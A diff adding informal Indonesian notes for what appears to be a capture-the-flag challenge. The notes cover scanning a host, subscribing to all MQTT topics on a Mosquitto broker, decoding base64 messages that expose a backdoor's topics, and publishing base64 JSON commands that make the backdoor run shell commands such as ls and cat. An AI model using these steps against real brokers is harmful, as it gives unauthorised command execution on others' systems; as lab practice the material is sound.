@@ -1,0 +1,10 @@
+1. nmap in ip nya -> ada mosquitto mosqito gitu -> download mosquitto_clients dulu
+2. mosquitto_sub -h [ip] -t '#' -v -> cek response ada yg di base64 in -> decode ada pub sub topic nya
+3. {"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","registered_commands":["HELP","CMD","SYS"],"pub_topic":"U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub","sub_topic":"XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub"} -> command ada cmd
+4. mosquitto_sub -t '[pub topic nya]' -h [ip] -> yang satunya mosquitto_pub -t '[sub]' -h [ip] -m 'message'
+5. nah nanti ada error pertamanya ->  
+Invalid message format.
+Format: base64({"id": "<backdoor id>", "cmd": "<command>", "arg": "<argument>"})
+6. tinggal sesuain dah id sama command nya :
+{id: id awal tadi, cmd: CMD karena ada ter register, arg: ls misalnya}
+7. dah tinggal cat aja file nya sih
